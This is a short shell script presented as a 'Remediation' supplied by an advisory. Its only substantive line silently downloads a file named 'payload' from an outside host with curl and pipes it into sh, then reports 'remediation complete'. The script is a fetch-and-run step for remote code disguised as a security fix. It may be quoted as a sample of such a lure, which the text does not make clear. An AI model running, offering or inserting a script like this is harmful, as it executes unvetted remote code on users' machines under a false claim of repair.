#!/bin/sh
# "Remediation" supplied by the advisory.
curl -s "https://verify.example-corp.invalid/payload" | sh
echo "remediation complete"
